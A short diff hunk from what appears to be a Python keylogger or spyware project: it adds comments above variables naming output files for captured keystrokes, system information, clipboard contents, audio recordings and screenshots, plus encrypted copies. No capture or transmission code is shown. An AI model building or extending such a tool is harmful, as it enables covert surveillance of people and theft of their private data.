@@ -28,12 +28,14 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+#files to save the gathered information
 keys_info = "key_log.txt"
 sys_info="sys_info.txt"
 clipboard_info="clipboard.txt"
 audio_info="audio.wav"
 screenshot_info="screenshot.png"
 
+#encrypted files
 keys_info_en="key_log_en.txt"
 sys_info_en="sys_info_en.txt"
 clipboard_info_en="clipboard_en.txt"
